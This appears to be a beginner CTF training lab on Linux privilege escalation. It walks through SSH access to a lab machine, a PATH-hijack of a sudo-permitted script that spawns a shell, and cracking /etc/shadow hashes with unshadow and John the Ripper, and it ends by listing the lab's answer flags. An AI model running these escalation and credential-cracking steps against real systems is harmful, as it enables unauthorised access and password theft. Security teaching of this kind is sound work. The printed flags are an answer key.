# Guided Lab: Priv Esc

## Introduction

Welcome to this First guided lab, today we will be talking about **Privilege Escalation** with a real case scenario, while praticing what we learnt about linux commands and tools.

Follow along and try to hack the system !

## Description

Let's suppose that after a pentesting process of an application you finally retrieved the credentials of a user. It's time to access theremote server and try to gain the root uer.

In this lab, we will practice a **User to Administrator** scenario in order to retrieve the `root` credentials, by using different techniques and methods.

## Instructions

### Accessing the machine

Our first oder is to access the machine remotly. To do that, you need to use the `ssh` command with the following informations:

- **Port:** 1337
- **User:** ctf
- **HOSTNAME:** IP_ADDRESS of the Instructor

**Reminder:** Here is a reminder of how the `ssh` command should look like:

```sh
ssh -p PORT USER@HOSTNAME
```

From there, the shell will ask you for the password of the user:

- **Password:** ctf

If you successfully access the machine, you will be able to use the shell of the machine, try to the following commands:

- `whoami`: see if the prompts the same user that you logged in with
- **Navigation:** using `ls` and stuff, try to navigate arround and see the structure of the file system in that server and which information can you possibly retrieve:
  - **Users:** in the `/etc/passwd` file, check available users.
  - **Hosts:** in the `/etc/hosts`, see if there is some domains available to check.
  - **Applications:** using the `ps` command, see if the is some unusual process or running applications.

In the home directory of the user `USER` (`/home/USER`), you will find a `user.txt` file, read it and get you first Flag !

### Path manipulation

When entering the instance, we can find the `flag.txt` in the currect directory, we will find also a shell script `my_ls` :

```
ctf@path-57568c5f85-czp5h:~$ ls -l
total 8
-r--r----- 1 root ctf-cracked 40 Dec 20 18:44 flag.txt
-r-xr-xr-x 1 root root        21 Dec 20 18:44 my_ls
ctf@path-57568c5f85-czp5h:~$ cat my_ls
#!/bin/bash

ls -alh
```

It seems like our `my_ls` script is executing `ls` command.

Also when trying to read the `flag.txt`, unfortunatly, we can't read it. First thing to do is to check for sudo priviledges for our user :

```
ctf@path-57568c5f85-czp5h:~$ sudo -l
[sudo] password for ctf: 
Matching Defaults entries for ctf on path-57568c5f85-czp5h:
    env_reset, mail_badpass, env_keep+=PATH

User ctf may run the following commands on path-57568c5f85-czp5h:
    (ctf-cracked) /home/ctf/my_ls

```

Let's try to execute the `my_ls` script :

```
ctf@path-57568c5f85-czp5h:~$ sudo -u ctf-cracked ./my_ls 
total 28K
drwxr-xr-x 1 root root        4.0K Dec 24 16:22 .
drwxr-xr-x 1 root root        4.0K Dec 24 16:22 ..
-rw-r--r-- 1 root root         220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 root root        3.7K Jan  6  2022 .bashrc
-rw-r--r-- 1 root root         807 Jan  6  2022 .profile
-r--r----- 1 root ctf-cracked   40 Dec 20 18:44 flag.txt
-r-xr-xr-x 1 root root          21 Dec 20 18:44 my_ls

```

Nothing new, it just list content of current directory (it doesn't take arguments).


Now, moving on to the Now, moving on to the solution, and since the challenge is named `PATH`, Let's try to do some **Linux Privilege Escalation Using PATH Variable**. First, let's see the content of `$PATH` variable :

```
ctf@path-57568c5f85-czp5h:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Now, let's see if this variable is writable :

```

ctf@path-57568c5f85-czp5h:~$ PATH=""
ctf@path-57568c5f85-czp5h:~$ echo $PATH

ctf@path-57568c5f85-czp5h:~$ PATH=".:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
"
ctf@path-57568c5f85-czp5h:~$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
ctf@path-57568c5f85-czp5h:~$ export PATH=$PATH
```

Indeed, we can modify the content of the `PATH` variable and add other paths to the directories we like.

So, for the solution, let's try to use the `my_ls` script and this `PATH` vulnerability to do a Privilege Escalation. The main idea is to create a new `ls` command that actually pops a shell when it is executed. and to make it priviledged from the usual `ls` (since after trying, we can't write in the `/bin` folder, i.e modify original one), by adding a new path to a folder, that we can write and modify : `/tmp`.

```
ctf@path-57568c5f85-czp5h:~$ cd /tmp
ctf@path-57568c5f85-czp5h:/tmp$ echo "/bin/bash" > ls
ctf@path-57568c5f85-czp5h:/tmp$ chmod 777 ls
ctf@path-57568c5f85-czp5h:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
ctf@path-57568c5f85-czp5h:/tmp$ export PATH=/tmp:$PATH
ctf@path-57568c5f85-czp5h:/tmp$ cd /home/ctf/
ctf@path-57568c5f85-czp5h:~$ sudo -u ctf-cracked ./my_ls
[sudo] password for ctf
ctf-cracked@path-57568c5f85-czp5h:/home/ctf$ whoami
ctf-cracked
ctf-cracked@path-57568c5f85-czp5h:/home/ctf$ cat flag.txt
```

### Cracking Passwords

we are going to show how we can crack `/etc/shadow` file using John the Ripper. It is common in CTF like events to somehow get access to the shadow file or part of it and having to crack it so you can get the password of a user.

The process involves two basic steps, the first is called unshadowing while the second is the cracking itself. Unshadowing is a process where we combine the `/etc/passwd` file along with the `/etc/shadow` in order for John to be able to understand what we are feeding to it. Unshadow is a tool that handles this task and it is part of the John package. In order to unshadow the shadow file we need to also have the equivalent line from the passwd for the user of our interest. An example is the following:

```
# /etc/passwd line
root:x:0:0:root:/root:/bin/bash

# /etc/shadow line
root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7:::
```

First commands to do is the following is to print out `/etc/passwd` to print current users, and `/etc/shadow` to print their respective passwords:

```
cat /etc/passwd > passwd.txt
```

```
cat /etc/shadow > shadow.txt
```

**Note:** You can send them via a remote server or just copy them to your local machine

From there, In order to unshadow to the two files we need to execute:

```
unshadow passwd.txt shadow.txt > unshadowed.txt
```

Finally, we have the `unshadowed.txt` file. Next and final step is to actually start the cracking with John. It is up to you which cracking method you will chose, though a bruteforcing using a wordlist is usually enough for CTFs. An example attack using a wordlist would be launched like below:

```
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

## Flag

- PATH Flag: gomycode{fiRST_pR1v_3Sc_w1tH_p4TH_m4n1PUL4TioN}
- User Flag: gomycode{FIr$T_fL4g_To_BoOST_y0UR_F3ELinGs}
- Root Flag: 123456

## More Infromation

- JohnTheRipper to crack password: https://erev0s.com/blog/cracking-etcshadow-john/
